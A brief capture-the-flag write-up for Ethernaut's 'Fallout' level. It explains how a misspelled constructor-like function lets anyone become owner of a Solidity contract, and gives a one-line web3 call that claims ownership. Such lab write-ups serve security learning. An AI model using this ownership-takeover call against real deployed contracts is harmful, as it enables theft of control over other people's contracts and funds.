# Level 2: [Fallout](https://ethernaut.openzeppelin.com/level/0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7)

## Level objectives:
1. Claim ownership of contract.

## Steps:
- The contract defines a function `Fal1out()` that is indicated to be a contstructor function in the comments.
- It sets `owner = msg.sender;`
- Since it has is missing the constructor declaration, this function can be called by anyone.
- We abuse this by:
```sol
contract.Fal1out.sendTransaction({
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4"
});
```
